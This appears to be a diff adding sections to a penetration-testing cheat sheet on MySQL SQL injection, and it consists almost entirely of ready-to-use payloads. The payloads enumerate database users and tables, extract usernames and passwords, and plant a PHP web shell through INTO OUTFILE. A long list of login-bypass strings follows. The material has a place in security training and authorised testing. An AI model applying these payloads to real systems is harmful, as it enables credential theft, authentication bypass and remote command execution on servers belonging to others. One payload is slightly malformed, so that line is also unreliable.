@@ -113,3 +113,58 @@ SELECT system_user();*
     *SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
     List tables
     *SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
+
+MySql in-band, union based SQLI exploitation
+    Enumerate user
+    *?id=1 union select 1,2,3,4,user(),6,7,8,9*
+    Enumerate version
+    *?id=1 union select 1,2,3,4,version(),6,7,8,9*
+    Get all tables
+    *?=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables*
+    Get all values from a specific column:
+    *?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'*
+    Get username and password with a delimiter:
+    *id=1 union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users*
+    Getting a shell
+    *?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'*
+
+
+SQLi find number of columns using order by
+    We can use order by to order the result by a given column, if the column does not exist, we will get an error:
+    *vuln.php?id=1 order by 9 # This trhows no error
+vuln.php?id=1 order by 10 # This throws error*
+
+
+SQLI login bypass
+    *-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x*
+
